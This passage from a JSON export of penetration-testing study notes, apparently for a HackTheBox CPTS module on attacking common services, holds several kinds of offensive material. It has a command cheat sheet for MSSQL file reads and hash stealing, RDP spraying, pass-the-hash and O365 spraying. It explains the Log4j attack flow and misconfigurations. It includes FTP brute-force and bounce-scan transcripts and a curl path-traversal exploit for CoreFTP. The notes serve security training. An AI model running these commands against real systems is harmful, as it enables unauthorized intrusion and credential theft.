the secure file privileges are empty to read locally stored files on the system.|\n|`sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`|Read local files in MSSQL.|\n|`mysql> select LOAD_FILE(\"/etc/passwd\");`|Read local files in MySQL.|\n|`sqlcmd> EXEC master..xp_dirtree '\\\\10.10.110.17\\share\\'`|Hash stealing using the `xp_dirtree` command in MSSQL.|\n|`sqlcmd> EXEC master..xp_subdirs '\\\\10.10.110.17\\share\\'`|Hash stealing using the `xp_subdirs` command in MSSQL.|\n|`sqlcmd> SELECT srvname, isremote FROM sysservers`|Identify linked servers in MSSQL.|\n|`sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\\SQLEXPRESS]`|Identify the user and its privileges used for the remote connection in MSSQL.|\n\n---\n\n## Attacking RDP\n\n|**Command**|**Description**|\n|---|---|\n|`crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`|Password spraying against the RDP service.|\n|`hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`|Brute-forcing the RDP service.|\n|`rdesktop -u admin -p password123 192.168.2.143`|Connect to the RDP service using `rdesktop` in Linux.|\n|`tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`|Impersonate a user without its password.|\n|`net start sessionhijack`|Execute the RDP session hijack.|\n|`reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`|Enable \"Restricted Admin Mode\" on the target Windows host.|\n|`xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA`|Use the Pass-The-Hash technique to login on the target host without a password.|\n\n---\n\n## Attacking DNS\n\n|**Command**|**Description**|\n|---|---|\n|`dig AXFR @ns1.inlanefreight.htb inlanefreight.htb`|Perform an AXFR zone transfer attempt against a specific name server.|\n|`subfinder -d inlanefreight.com -v`|Brute-forcing subdomains.|\n|`host support.inlanefreight.com`|DNS lookup for the specified subdomain.|\n\n---\n\n## Attacking Email Services\n\n| **Command**                                                                                                                                             | **Description**                                                                        |\n| ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |\n| `host -t MX microsoft.com`                                                                                                                              | DNS lookup for mail servers for the specified domain.                                  |\n| `dig mx inlanefreight.com \\| grep \"MX\" \\| grep -v \";\"`                                                                                                  | DNS lookup for mail servers for the specified domain.                                  |\n| `host -t A mail1.inlanefreight.htb.`                                                                                                                    | DNS lookup of the IPv4 address for the specified subdomain.                            |\n| `telnet 10.10.110.20 25`                                                                                                                                | Connect to the SMTP server.                                                            |\n| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`                                                                           | SMTP user enumeration using the RCPT command against the specified host.               |\n| `python3 o365spray.py --validate --domain msplaintext.xyz`                                                                                              | Verify the usage of Office365 for the specified domain.                                |\n| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`                                                                                     | Enumerate existing users using Office365 on the specified domain.                      |\n| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`                                         | Password spraying against a list of users that use Office365 for the specified domain. |\n| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`                                                                                               | Brute-forcing the POP3 service.                                                        |\n| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` |                                                                                        |",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/02- The Concept of Attacks",
    "path": "02_CPTS/10-Attacking Common Services/02- The Concept of Attacks.md",
    "title": "02  The Concept Of Attacks",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- To effectively understand attacks on the different services, we should look at how these services can be attacked. A concept is an outlined plan that is applied to future projects. As an example, ...",
    "category": "02_CPTS",
    "content": "\n---\n\nTo effectively understand attacks on the different services, we should look at how these services can be attacked. A concept is an outlined plan that is applied to future projects. As an example, we can think of the concept of building a house. Many houses have a basement, four walls, and a roof. Most homes are built this way, and it is a concept that is applied all over the world. The finer details, such as the material used or the type of design, are flexible and can be adapted to individual wishes and circumstances. This example shows that a concept needs a general categorization (floor, walls, roof).\n\nIn our case, we need to create a concept for the attacks on all possible services and divide it into categories that summarize all services but leave the individual attack methods.\n\nTo explain a little more clearly what we are talking about here, we can try to group the services SSH, FTP, SMB, and HTTP ourselves and figure out what these services have in common. Then we need to create a structure that will allow us to identify the attack points of these different services using a single pattern.\n\nAnalyzing commonalities and creating pattern templates that fit all conceivable cases is not a finished product but rather a process that makes these pattern templates grow larger and larger. Therefore, we have created a pattern template for this topic for you to better and more efficiently teach and explain the concept behind the attacks.\n\n#### The Concept of Attacks\n\n![Diagram showing flow from Source to Processes, Privileges, and Destination with related components.](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)\n\nThe concept is based on four categories that occur for each vulnerability. First, we have a `Source` that performs the specific request to a `Process` where the vulnerability gets triggered. Each process has a specific set of `Privileges` with which it is executed. Each process has a task with a specific goal or `Destination` to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.\n\nEvery task and piece of information follows a specific pattern, a cycle, which we have deliberately made linear. This is because the `Destination` does not always serve as a `Source` and is therefore not treated as a source of a new task.\n\nFor any task to come into existence at all, it needs an idea, information (`Source`), a planned process for it (`Processes`), and a specific goal (`Destination`) to be achieved. Therefore, the category of `Privileges` is necessary to control information processing appropriately.\n\n---\n\n## Source\n\nWe can generalize `Source` as a source of information used for the specific task of a process. There are many different ways to pass information to a process. The graphic shows some of the most common examples of how information is passed to the processes.\n\n|**Information Source**|**Description**|\n|---|---|\n|`Code`|This means that the already executed program code results are used as a source of information. These can come from different functions of a program.|\n|`Libraries`|A library is a collection of program resources, including configuration data, documentation, help data, message templates, prebuilt code and subroutines, classes, values, or type specifications.|\n|`Config`|Configurations are usually static or prescribed values that determine how the process processes information.|\n|`APIs`|The application programming interface (API) is mainly used as the interface of programs for retrieving or providing information.|\n|`User Input`|If a program has a function that allows the user to enter specific values used to process the information accordingly, this is the manual entry of information by a person.|\n\nThe source is, therefore, the source that is exploited for vulnerabilities. It does not matter which protocol is used because HTTP header injections can be manipulated manually, as can buffer overflows. The source for this can therefore be categorized as `Code`. So let us take a closer look at the pattern template based on one of the latest critical vulnerabilities that most of us have heard of.\n\n#### Log4j\n\nA great example is the critical Log4j vulnerability ([CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228)) which was published at the end of 2021. Log4j is a framework or `Library` used to log application messages in Java and other programming languages. This library contains classes and functions that other programming languages can integrate. For this purpose, information is documented, similar to a logbook. Furthermore, the scope of the documentation can be configured extensively. As a result, it has become a standard within many open source and commercial software products. In this example, an attacker can manipulate the HTTP User-Agent header and insert a JNDI lookup as a command intended for the Log4j `library`. Accordingly, not the actual User-Agent header, such as Mozilla 5.0, is processed, but the JNDI lookup.\n\n---\n\n## Processes\n\nThe `Process` is about processing the information forwarded from the source. These are processed according to the intended task determined by the program code. For each task, the developer specifies how the information is processed. This can occur using classes with different functions, calculations, and loops. The variety of possibilities for this is as diverse as the number of developers in the world. Accordingly, most of the vulnerabilities lie in the program code executed by the process.\n\n|**Process Components**|**Description**|\n|---|---|\n|`PID`|The Process-ID (PID) identifies the process being started or is already running. Running processes have already assigned privileges, and new ones are started accordingly.|\n|`Input`|This refers to the input of information that could be assigned by a user or as a result of a programmed function.|\n|`Data processing`|The hard-coded functions of a program dictate how the information received is processed.|\n|`Variables`|The variables are used as placeholders for information that different functions can further process during the task.|\n|`Logging`|During logging, certain events are documented and, in most cases, stored in a register or a file. This means that certain information remains in the system.|\n\n#### Log4j\n\nThe process of Log4j is to log the User-Agent as a string using a function and store it in the designated location. The vulnerability in this process is the misinterpretation of the string, which leads to the execution of a request instead of logging the events. However, before we go further into this function, we need to talk about privileges.\n\n---\n\n## Privileges\n\n`Privileges` are present in any system that controls processes. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. If we use a ticket intended for a particular region, we will be able to use the bus, and otherwise, we will not. These privileges (or figuratively speaking, our tickets) can also be used for different means of transport, such as planes, trains, boats, and others. In computer systems, these privileges serve as control and segmentation of actions for which different permissions, controlled by the system, are needed. Therefore, the rights are checked based on this categorization when a process needs to fulfill its task. If the process satisfies these privileges and conditions, the system approves the action requested. We can divide these privileges into the following areas:\n\n|**Privileges**|**Description**|\n|---|---|\n|`System`|These privileges are the highest privileges that can be obtained, which allow any system modification. In Windows, this type of privilege is called `SYSTEM`, and in Linux, it is called `root`.|\n|`User`|User privileges are permissions that have been assigned to a specific user. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.|\n|`Groups`|Groups are a categorization of at least one user who has certain permissions to perform specific actions.|\n|`Policies`|Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.|\n|`Rules`|Rules are the permissions to perform actions handled from within the applications themselves.|\n\n#### Log4j\n\nWhat made the Log4j vulnerability so dangerous was the `Privileges` that the implementation brought. Logs are often considered sensitive because they can contain data about the service, the system itself, or even customers. Therefore, logs are usually stored in locations that no regular user should be able to access. Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. The process itself exploited the library by manipulating the User-Agent so that the process misinterpreted the source and led to the execution of user-supplied code.\n\n---\n\n## Destination\n\nEvery task has at least one purpose and goal that must be fulfilled. Logically, if any data set changes were missing or not stored or forwarded anywhere, the task would be generally unnecessary. The result of such a task is either stored somewhere or forwarded to another processing point. Therefore we speak here of the `Destination` where the changes will be made. Such processing points can point either to a local or remote process. Therefore, at the local level, local files or records may be modified by the process or be forwarded to other local services for further use. However, this does not exclude the possibility that the same process could reuse the resulting data too. If the process is completed with the data storage or its forwarding, the cycle leading to the task's completion is closed.\n\n|**Destination**|**Description**|\n|---|---|\n|`Local`|The local area is the system's environment in which the process occurred. Therefore, the results and outcomes of a task are either processed further by a process that includes changes to data sets or storage of the data.|\n|`Network`|The network area is mainly a matter of forwarding the results of a process to a remote interface. This can be an IP address and its services or even entire networks. The results of such processes can also influence the route under certain circumstances.|\n\n#### Log4j\n\nThe misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the `Destination` in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (`RCE`) vulnerability.\n\nGovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail.\n\n![Diagram of Log4j JNDI attack flow from attacker to vulnerable server and malicious LDAP server, with prevention steps like blocking WAF, disabling JNDI lookups, and patching Log4j.](https://academy.hackthebox.com/storage/modules/116/log4jattack.png) Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/\n\nThis graphic breaks down the Log4j JNDI attack based on the `Concept of Attacks`.\n\n#### Initiation of the Attack\n\n|**Step**|**Log4j**|**Concept of Attacks - Category**|\n|---|---|---|\n|`1.`|The attacker manipulates the user agent with a JNDI lookup command.|`Source`|\n|`2.`|The process misinterprets the assigned user agent, leading to the execution of the command.|`Process`|\n|`3.`|The JNDI lookup command is executed with administrator privileges due to logging permissions.|`Privileges`|\n|`4.`|This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.|`Destination`|\n\nThis is when the cycle starts all over again, but this time to gain remote access to the target system.\n\n#### Trigger Remote Code Execution\n\n|**Step**|**Log4j**|**Concept of Attacks - Category**|\n|---|---|---|\n|`5.`|After the malicious Java class is retrieved from the attacker's server, it is used as a source for further actions in the following process.|`Source`|\n|`6.`|Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.|`Process`|\n|`7.`|The malicious code is executed with administrator privileges due to logging permissions.|`Privileges`|\n|`8.`|The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.|`Destination`|\n\nFinally, we see a pattern that we can repeatedly use for our attacks. This pattern template can be used to analyze and understand exploits and debug our own exploits during development and testing. In addition, this pattern template can also be applied to source code analysis, which allows us to check certain functionality and commands in our code step-by-step. Finally, we can also think categorically about each task's dangers individually.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/03- Service Misconfigurations",
    "path": "02_CPTS/10-Attacking Common Services/03- Service Misconfigurations.md",
    "title": "03  Service Misconfigurations",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Misconfigurations usually happen when a system administrator, technical support, or developer does not correctly configure the security framework of an application, website, desktop, or server leading...",
    "category": "02_CPTS",
    "content": "Misconfigurations usually happen when a system administrator, technical support, or developer does not correctly configure the security framework of an application, website, desktop, or server leading to dangerous open pathways for unauthorized users. Let's explore some of the most typical misconfigurations of common services.\n\n---\n\n## Authentication\n\nIn previous years (though we still see this sometimes during assessments), it was widespread for services to include default credentials (username and password). This presents a security issue because many administrators leave the default credentials unchanged. Nowadays, most software asks users to set up credentials upon installation, which is better than default credentials. However, keep in mind that we will still find vendors using default credentials, especially on older applications.\n\nEven when the service does not have a set of default credentials, an administrator may use weak passwords or no passwords when setting up services with the idea that they will change the password once the service is set up and running.\n\nAs administrators, we need to define password policies that apply to software tested or installed in our environment. Administrators should be required to comply with a minimum password complexity to avoid user and passwords combinations such as:\n\nService Misconfigurations\n\n```shell-session\nadmin:admin\nadmin:password\nadmin:<blank>\nroot:12345678\nadministrator:Password\n```\n\nOnce we grab the service banner, the next step should be to identify possible default credentials. If there are no default credentials, we can try the weak username and password combinations listed above.\n\n#### Anonymous Authentication\n\nAnother misconfiguration that can exist in common services is anonymous authentication. The service can be configured to allow anonymous authentication, allowing anyone with network connectivity to the service without being prompted for authentication.\n\n#### Misconfigured Access Rights\n\nLet's imagine we retrieved credentials for a user whose role is to upload files to the FTP server but was given the right to read every FTP document. The possibility is endless, depending on what is within the FTP Server. We may find files with configuration information for other services, plain text credentials, usernames, proprietary information, and Personally identifiable information (PII).\n\nMisconfigured access rights are when user accounts have incorrect permissions. The bigger problem could be giving people lower down the chain of command access to private information that only managers or administrators should have.\n\nAdministrators need to plan their access rights strategy, and there are some alternatives such as [Role-based access control (RBAC)](https://en.wikipedia.org/wiki/Role-based_access_control), [Access control lists (ACL)](https://en.wikipedia.org/wiki/Access-control_list). If we want more detailed pros and cons of each method, we can read [Choosing the best access control strategy](https://authress.io/knowledge-base/role-based-access-control-rbac) by Warren Parad from Authress.\n\n---\n\n## Unnecessary Defaults\n\nThe initial configuration of devices and software may include but is not limited to settings, features, files, and credentials. Those default values are usually aimed at usability rather than security. Leaving it default is not a good security practice for a production environment. Unnecessary defaults are those settings we need to change to secure a system by reducing its attack surface.\n\nWe might as well deliver up our company's personal information on a silver platter if we take the easy road and accept the default settings while setting up software or a device for the first time. In reality, attackers may obtain access credentials for specific equipment or abuse a weak setting by conducting a short internet search.\n\n[Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/) are part of the [OWASP Top 10 list](https://owasp.org/Top10/). Let's take a look at those related to default values:\n\n- Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).\n- Default accounts and their passwords are still enabled and unchanged.\n- Error handling reveals stack traces or other overly informative error messages to users.\n- For upgraded systems, the latest security features are disabled or not configured securely.\n\n---\n\n## Preventing Misconfiguration\n\nOnce we have figured out our environment, the most straightforward strategy to control risk is to lock down the most critical infrastructure and only allow desired behavior. Any communication that is not required by the program should be disabled. This may include things like:\n\n- Admin interfaces should be disabled.\n- Debugging is turned off.\n- Disable the use of default usernames and passwords.\n- Set up the server to prevent unauthorized access, directory listing, and other issues.\n- Run scans and audits regularly to help discover future misconfigurations or missing fixes.\n\nThe OWASP Top 10 provides a section on how to secure the installation processes:\n\n- A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. In addition, this process should be automated to minimize the effort required to set up a new secure environment.\n    \n- A minimal platform without unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.\n    \n- A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see A06:2021-Vulnerable and Outdated Components). Review cloud storage permissions (e.g., S3 bucket permissions).\n    \n- A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).\n    \n- Sending security directives to clients, e.g., security headers.\n    \n- An automated process to verify the effectiveness of the configurations and settings in all environments.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/04- Finding Sensitive Information",
    "path": "02_CPTS/10-Attacking Common Services/04- Finding Sensitive Information.md",
    "title": "04  Finding Sensitive Information",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is es...",
    "category": "02_CPTS",
    "content": "When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is essential.\n\nLet us imagine we are in an engagement with a client, we are targeting email, FTP, databases, and storage, and our goal is to obtain Remote Code Execution (RCE) on any of these services. We started the enumeration and tried anonymous access to all services, and only FTP has anonymous access. We found an empty file within the FTP service, but with the name `johnsmith`, we tried `johnsmith` as the FTP user and password, but it did not work. We try the same against the email service, and we successfully login. With email access, we start searching emails containing the word `password`, we find many, but one of them contains John's credentials for the MSSQL database. We access the database and use the built-in functionality to execute commands and successfully get RCE on the database server. We successfully met our goal.\n\nA misconfigured service let us access a piece of information that initially may look insignificant, `johnsmith`, but that information opened the doors for us to discover more information and finally get remote code execution on the database server. This is the importance of paying attention to every piece of information, every detail, as we enumerate and attack common services.\n\nSensitive information may include, but is not limited to:\n\n- Usernames.\n- Email Addresses.\n- Passwords.\n- DNS records.\n- IP Addresses.\n- Source code.\n- Configuration files.\n- PII.\n\nThis module will cover some common services where we can find interesting information and discover different methods and tools we can use to automate our discovery process. These services include:\n\n- File Shares.\n- Email.\n- Databases.\n\n---\n\n#### Understanding of What We Have to Look for\n\nEvery target is unique, and we need to familiarize ourselves with our target, its processes, procedures, business model, and purpose. Once we understand our target, we can think about what information is essential for them and what kind of information is helpful for our attack.\n\nThere are two key elements to finding sensitive information:\n\n1. We need to understand the service and how it works.\n2. We need to know what we are looking for.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/05- Attacking FTP",
    "path": "02_CPTS/10-Attacking Common Services/05- Attacking FTP.md",
    "title": "05  Attacking FTP",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listi...",
    "category": "02_CPTS",
    "content": "The [File Transfer Protocol](https://en.wikipedia.org/wiki/File_Transfer_Protocol) (`FTP`) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listing files, and renaming and deleting directories or files. By default, FTP listens on port `TCP/21`.\n\nTo attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Therefore, after gaining access to the FTP Service, we need to be aware of the content in the directory so we can search for sensitive or critical information, as we previously discussed. The protocol is designed to trigger downloads and uploads with commands. Thus, files can be transferred between servers and clients. A file management system is available to the user, known by the operating system. Files can be stored in folders, which may be located in other folders. This results in a hierarchical directory structure. Most companies use this service for software or website development processes.\n\n---\n\n## Enumeration\n\n`Nmap` default scripts `-sC` includes the [ftp-anon](https://nmap.org/nsedoc/scripts/ftp-anon.html) Nmap script which checks if a FTP server allows anonymous logins. The version enumeration flag `-sV` provides interesting information about FTP services, such as the FTP banner, which often includes the version name. We can use the `ftp` client or `nc` to interact with the FTP service. By default, FTP runs on TCP port 21.\n\n#### Nmap\n\nAttacking FTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ sudo nmap -sC -sV -p 21 192.168.2.142 \n\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT\nNmap scan report for 192.168.2.142\nHost is up (0.00054s latency).\n\nPORT   STATE SERVICE\n21/tcp open  ftp\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| -rw-r--r--   1 1170     924            31 Mar 28  2001 .banner\n| d--x--x--x   2 root     root         1024 Jan 14  2002 bin\n| d--x--x--x   2 root     root         1024 Aug 10  1999 etc\n| drwxr-srwt   2 1170     924          2048 Jul 19 18:48 incoming [NSE: writeable]\n| d--x--x--x   2 root     root         1024 Jan 14  2002 lib\n| drwxr-sr-x   2 1170     924          1024 Aug  5  2004 pub\n|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.\n```\n\n---\n\n## Misconfigurations\n\nAs we discussed, anonymous authentication can be configured for different services such as FTP. To access with anonymous login, we can use the `anonymous` username and no password. This will be dangerous for the company if read and write permissions have not been set up correctly for the FTP service. Because with the anonymous login, the company could have stored sensitive information in a folder that the anonymous user of the FTP service could have access to.\n\nThis would enable us to download this sensitive information or even upload dangerous scripts. Using other vulnerabilities, such as path traversal in a web application, we would be able to find out where this file is located and execute it as PHP code, for example.\n\n#### Anonymous Authentication\n\nAttacking FTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ ftp 192.168.2.142    \n                     \nConnected to 192.168.2.142.\n220 (vsFTPd 2.3.4)\nName (192.168.2.142:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt\n226 Directory send OK.\n```\n\nOnce we get access to an FTP server with anonymous credentials, we can start searching for interesting information. We can use the commands `ls` and `cd` to move around directories like in Linux. To download a single file, we use `get`, and to download multiple files, we can use `mget`. For upload operations, we can use `put` for a simple file or `mput` for multiple files. We can use `help` in the FTP client session for more information.\n\nIn the [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) module, we cover detailed information about possible misconfigurations of such services. For example, many different settings can be applied to an FTP server, and some of them lead to different options that could cause possible attacks against that service. However, this module will focus on specific attacks rather than finding individual misconfigurations.\n\n---\n\n## Protocol Specifics Attacks\n\nMany different attacks and methods are protocol-based. However, it is essential to note that we are not attacking the individual protocols themselves but the services that use them. Since there are dozens of services for a single protocol and they process the corresponding information differently, we will look at some.\n\n#### Brute Forcing\n\nIf there is no anonymous authentication available, we can also brute-force the login for the FTP services using a list of the pre-generated usernames and passwords. There are many different tools to perform a brute-forcing attack. Let us explore one of them, [Medusa](https://github.com/jmk-foofus/medusa). With `Medusa`, we can use the option `-u` to specify a single user to target, or you can use the option `-U` to provide a file with a list of usernames. The option `-P` is for a file containing a list of passwords. We can use the option `-M` and the protocol we are targeting (FTP) and the option `-h` for the target hostname or IP address.\n\n**Note:** Although we may find services vulnerable to brute force, most applications today prevent these types of attacks. A more effective method is Password Spraying.\n\n#### Brute Forcing with Medusa\n\nAttacking FTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp \n                                                             \nMedusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      \nACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)\nACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)\nACCOUNT CHECK: [ftp] Host: 10.129.203.7 (1 of 1, 0 complete) User: fiona (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)\nACCOUNT FOUND: [ftp] Host: 10.129.203.7 User: fiona Password: family [SUCCESS]\n```\n\n#### FTP Bounce Attack\n\nAn FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.\n\nConsider we are targetting an FTP Server `FTP_DMZ` exposed to the internet. Another device within the same network, `Internal_DMZ`, is not exposed to the internet. We can use the connection to the `FTP_DMZ` server to scan `Internal_DMZ` using the FTP Bounce attack and obtain information about the server's open ports. Then, we can use that information as part of our attack against the infrastructure.\n\n![Diagram showing attacker using an intermediate device to connect to a target, execute commands, and receive sensitive data.](https://academy.hackthebox.com/storage/modules/116/ftp_bounce_attack.png) Source: [https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/](https://www.geeksforgeeks.org/what-is-ftp-bounce-attack/)\n\nThe `Nmap` -b flag can be used to perform an FTP bounce attack:\n\nAttacking FTP\n\n```shell-session\ndrxh3kr@htb[/htb]$ nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2\n\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT\nResolved FTP bounce attack proxy to 10.10.110.213 (10.10.110.213).\nAttempting connection to ftp://anonymous:password@10.10.110.213:21\nConnected:220 (vsFTPd 3.0.3)\nLogin credentials accepted by FTP server!\nInitiating Bounce Scan at 04:55\nFTP command misalignment detected ... correcting.\nCompleted Bounce Scan at 04:55, 0.54s elapsed (1 total ports)\nNmap scan report for 172.17.0.2\nHost is up.\n\nPORT   STATE  SERVICE\n80/tcp open http\n\n<SNIP>\n```\n\nModern FTP servers include protections that, by default, prevent this type of attack, but if these features are misconfigured in modern-day FTP servers, the server can become vulnerable to an FTP Bounce attack.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/06- Latest FTP Vulnerabilities",
    "path": "02_CPTS/10-Attacking Common Services/06- Latest FTP Vulnerabilities.md",
    "title": "06  Latest FTP Vulnerabilities",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- In discussing the latest vulnerabilities, we will focus this section and the following ones on one of the previously shown attacks and present it as simply as possible without going into too much ...",
    "category": "02_CPTS",
    "content": "\n---\n\nIn discussing the latest vulnerabilities, we will focus this section and the following ones on one of the previously shown attacks and present it as simply as possible without going into too much technical detail. This should help us facilitate the concept of the attack through an example related to a specific service to gain a better understanding.\n\nIn this case, we will discuss the `CoreFTP before build 727` vulnerability assigned [CVE-2022-22836](https://nvd.nist.gov/vuln/detail/CVE-2022-22836). This vulnerability is for an FTP service that does not correctly process the `HTTP PUT` request and leads to an `authenticated directory`/`path traversal,` and `arbitrary file write` vulnerability. This vulnerability allows us to write files outside the directory to which the service has access.\n\n---\n\n## The Concept of the Attack\n\nThis FTP service uses an HTTP `POST` request to upload files. However, the CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files. Let's have a look at the attack based on our concept. The [exploit](https://www.exploit-db.com/exploits/50652) for this attack is relatively straightforward, based on a single `cURL` command.\n\n#### CoreFTP Exploitation\n\nLatest FTP Vulnerabilities\n\n```shell-session\ndrxh3kr@htb[/htb]$ curl -k -X PUT -H \"Host: <IP>\" --basic -u <username>:<password> --data-binary \"PoC.\" --path-as-is https://<IP>/../../../../../../whoops\n```\n\nWe create a raw HTTP `PUT` request (`-X PUT`) with basic auth (`--basic -u <username>:<password>`), the path for the file (`--path-as-is https://<IP>/../../../../../whoops`), and its content (`--data-binary \"PoC.\"`) with this command. Additionally, we specify the host header (`-H \"Host: <IP>\"`) with the IP address of our target system.\n\n#### The Concept of Attacks\n\n![Diagram showing flow from Source to Processes, Privileges, and Destination with related components.](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)\n\nIn short, the actual process misinterprets the user's input of the path. This leads to access to the restricted folder being bypassed. As a result, the write permissions on the HTTP `PUT` request are not adequately controlled, which leads to us being able to create the files we want outside of the authorized folders. However, we will skip the explanation of the `Basic Auth` process and jump directly to the first part of the exploit.\n\n#### Directory Traversal\n\n|**Step**|**Directory Traversal**|**Concept of Attacks - Category**|\n|---|---|---|\n|`1.`|The user specifies the type of HTTP request with the file's content, including escaping characters to break out of the restricted area.|`Source`|\n|`2.`|The changed type of HTTP request, file contents, and path entered by the user are taken over and processed by the process.|`Process`|\n|`3.`|The application checks whether the user is authorized to be in the specified path. Since the restrictions only apply to a specific folder, all permissions granted to it are bypassed as it breaks out of that folder using the directory traversal.|`Privileges`|\n|`4.`|The destination is another process that has the task of writing the specified contents of the user on the local system.|`Destination`|\n\nUp to this point, we have bypassed the constraints imposed by the application using the escape characters (`../../../../`) and come to the second part, where the process writes the contents we specify to a file of our choice. This is when the cycle starts all over again, but this time to write contents to the target system.\n\n#### Arbitrary File Write\n\n|**Step**|**Arbitrary File Write**|**Concept of Attacks - Category**|\n|---|---|---|\n|`5.`|The same information that the user entered is used as the source. In this case, the filename (`whoops`) and the contents (`--data-binary \"PoC.\"`).|`Source`|\n|`6.`|The process takes the specified information and proceeds to write the desired content to the specified file.|`Process`|\n|`7.`|Since all restrictions were bypassed during the directory traversal vulnerability, the service approves writing the contents to the specified file.|`Privileges`|\n|`8.`|The filename specified by the user (`whoops`) with the desired content (`\"PoC.\"`) now serves as the destination on the local system.|`Destination`|\n\nAfter the task has been completed, we will be able to find this file with the corresponding contents on the target system.\n\n#### Target System\n\nLatest FTP Vulnerabilities\n\n```cmd-session\nC:\\> type C:\\whoops\n\nPoC.\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/10-Attacking Common Services/07- Attacking SMB",
    "path": "02_CPTS/10-Attacking Common Services/07- Attacking SMB.md",
    "title": "07  Attacking SMB",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over...",
    "category": "02_CPTS",
